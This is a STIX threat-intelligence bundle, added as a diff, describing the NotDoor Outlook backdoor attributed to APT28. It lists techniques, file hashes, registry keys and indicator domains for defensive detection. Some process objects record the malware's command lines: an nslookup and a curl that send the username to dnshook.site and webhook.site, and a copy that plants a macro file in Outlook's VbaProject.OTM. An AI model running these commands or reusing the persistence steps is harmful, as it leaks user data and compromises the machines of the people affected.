@@ -1,0 +1,241 @@
+{
+  "type": "bundle",
+  "id": "bundle--58d5cf0b-026c-4028-bd1f-55741f635afb",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--b87572f7-f372-4028-9fb4-5e949a0b4249",
+      "name": "DLL Sideloading",
+      "description": "Threat actors place a malicious DLL named identically to a legitimate one in the same directory as an application, causing the application to load the attacker's DLL. In NotDoor, OneDrive.exe is vulnerable to loading a malicious SSPICLI.dll.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1574.001",
+          "url": "https://attack.mitre.org/techniques/T1574/001/"
+        }
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "labels": [
+        "dll-sideloading"
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--3f823038-2a1b-48b6-8360-928793d3e58d",
+      "name": "Encoded PowerShell",
+      "description": "Malware executes base64-encoded PowerShell commands to obfuscate activity and evade detection. NotDoor uses encoded PowerShell for network checks, file copying, and command execution.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1027.010",
+          "url": "https://attack.mitre.org/techniques/T1027/010/"
+        }
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "labels": [
+        "powershell",
+        "obfuscation"
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--dad2a897-d583-43c7-9463-43552463a7eb",
+      "name": "Outlook Macro Persistence",
+      "description": "Malicious VBA macros are placed in Outlook's VbaProject.OTM file, enabling persistence and command execution via email triggers. NotDoor uses this technique for C2 and data exfiltration.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1137.005",
+          "url": "https://attack.mitre.org/techniques/T1137/005/"
+        }
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "labels": [
+        "outlook-macro",
+        "persistence"
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--d92968c6-3e46-496c-8f12-c330dfb6f6b6",
+      "name": "Registry Modification",
+      "description": "Malware modifies registry keys related to Outlook macro loading, macro security level, and dialog suppression to enable automatic macro execution and reduce user notifications. NotDoor sets LoadMacroProviderOnBoot, Level, and PONT_STRING keys.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1112",
+          "url": "https://attack.mitre.org/techniques/T1112/"
+        }
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "labels": [
+        "registry-modification",
+        "persistence",
+        "defense-evasion"
+      ]
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--6b91a9ec-d17c-4d95-9896-5defbd4337f3",
+      "name": "SSPICLI.dll file hash",
+      "description": "Malicious DLL used in NotDoor DLL sideloading attack.",
+      "pattern": "[file:hashes.'SHA-256' = '5a88a15a1d764e635462f78a0cd958b17e6d22c716740febc114a408eef66705']",
+      "valid_from": "2025-11-14T00:00:00Z",
+      "labels": [
+        "malicious-file",
+        "dll-sideloading"
+      ]
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--b27656e6-8a0e-454a-b8b5-31ba4a4951c6",
+      "name": "testtemp.ini file hash",
+      "description": "Malicious macro file used in NotDoor attack.",
+      "pattern": "[file:hashes.'SHA-256' = '8f4bca3c62268fff0458322d111a511e0bcfba255d5ab78c45973bd293379901']",
+      "valid_from": "2025-11-14T00:00:00Z",
+      "labels": [
+        "malicious-file",
+        "outlook-macro"
+      ]
+    },
+    {
+      "type": "intrusion-set",
+      "id": "intrusion-set--c72280a5-84c7-40da-b63f-3f86dc204519",
+      "name": "APT28",
+      "aliases": [
+        "Fancy Bear"
+      ],
+      "description": "APT28, also known as Fancy Bear, is a Russian state-sponsored threat group attributed to multiple cyber espionage campaigns. Lab52 attributed NotDoor campaigns to APT28.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0007/",
+          "external_id": "G0007"
+        }
+      ],
+      "object_marking_refs": [],
+      "labels": [
+        "russian",
+        "state-sponsored",
+        "apt"
+      ]
+    },
+    {
+      "type": "file",
+      "id": "file--1f2404fc-f8df-4f59-b686-55e1656fca13",
+      "name": "SSPICLI.dll",
+      "hashes": {
+        "SHA-256": "5a88a15a1d764e635462f78a0cd958b17e6d22c716740febc114a408eef66705"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--e9bebae9-815e-429c-9d0c-1157ddce1e37",
+      "name": "testtemp.ini",
+      "hashes": {
+        "SHA-256": "8f4bca3c62268fff0458322d111a511e0bcfba255d5ab78c45973bd293379901"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--81022351-d32d-4f89-81c1-eb79a0b6f516",
+      "name": "OneDrive.exe",
+      "path": "C:\\ProgramData\\OneDrive.exe"
+    },
+    {
+      "type": "file",
+      "id": "file--d2ec9187-f45a-4524-bf7d-6dc2308657c8",
+      "name": "tmp7E9C.dll",
+      "path": "C:\\ProgramData\\tmp7E9C.dll"
+    },
+    {
+      "type": "file",
+      "id": "file--39db8502-e08b-40cb-9cd3-5a3307954fcf",
+      "name": "tmp7EC9.dll",
+      "path": "C:\\ProgramData\\tmp7EC9.dll"
+    },
+    {
+      "type": "file",
+      "id": "file--15d7e884-d40a-407d-aa65-dcd98d1a89ea",
+      "name": "VbaProject.OTM",
+      "path": "%APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM"
+    },
+    {
+      "type": "directory",
+      "id": "directory--eae856eb-c95e-4d7e-8072-3fbffec88948",
+      "path": "%TEMP%\\Test"
+    },
+    {
+      "type": "process",
+      "id": "process--550f076c-ef80-4865-a3c2-ce2bcff7639b",
+      "command_line": "nslookup \"$env:USERNAME.910cf351-a05d-4f67-ab8e-6f62cfa8e26d.dnshook.site\""
+    },
+    {
+      "type": "process",
+      "id": "process--b061763e-e78a-48e7-8cad-cda2f992905f",
+      "command_line": "cmd /c curl \"http://webhook.site/910cf351-a05d-4f67-ab8e-6f62cfa8e26d?$env:USERNAME\""
+    },
+    {
+      "type": "process",
+      "id": "process--fad933f8-5305-4b4d-a20d-ce999017fb04",
+      "command_line": "$a=$env:APPDATA;copy c:\\programdata\\testtemp.ini \"$a\\Microsoft\\Outlook\\VbaProject.OTM\""
+    },
+    {
+      "type": "registry-key",
+      "id": "registry-key--f8b15e16-ec8f-488f-9828-cf107056abdd",
+      "key": "HKCU\\Software\\Microsoft\\Office\\Outlook\\LoadMacroProviderOnBoot",
+      "values": [
+        {
+          "name": "LoadMacroProviderOnBoot",
+          "data": "0x00000001"
+        }
+      ]
+    },
+    {
+      "type": "registry-key",
+      "id": "registry-key--b204b5d5-da32-4dc3-a7bb-214548fc4987",
+      "key": "HKCU\\Software\\Microsoft\\Office\\Outlook\\Security\\Level",
+      "values": [
+        {
+          "name": "Level",
+          "data": "0x00000001"
+        }
+      ]
+    },
+    {
+      "type": "registry-key",
+      "id": "registry-key--dfa558c0-a2bc-46be-b329-6e992c4dbae9",
+      "key": "HKCU\\Software\\Microsoft\\Office\\Outlook\\Options\\General\\PONT_STRING",
+      "values": [
+        {
+          "name": "PONT_STRING",
+          "data": "32"
+        }
+      ]
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--706fed86-5d41-4629-bdb2-04a4623eb7a3",
+      "value": "dnshook.site"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--dbb95e46-8d56-4739-aad1-b0a1567806ca",
+      "value": "webhook.site"
+    },
+    {
+      "type": "url",
+      "id": "url--782c1a3d-cdab-43f9-8576-a20fb4951c5e",
+      "value": "http://webhook.site/910cf351-a05d-4f67-ab8e-6f62cfa8e26d"
+    }
+  ]
+}
